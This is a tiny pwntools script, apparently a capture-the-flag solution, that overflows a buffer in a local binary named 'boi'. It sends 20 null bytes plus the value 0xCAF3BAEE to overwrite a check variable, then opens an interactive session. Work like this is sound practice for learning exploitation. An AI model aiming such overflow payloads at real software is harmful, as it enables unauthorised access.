from pwn import *

target=process('./boi')

payload=0x14*b'\x00'+p32(0x0CAF3BAEE)
target.sendline(payload)
target.interactive()
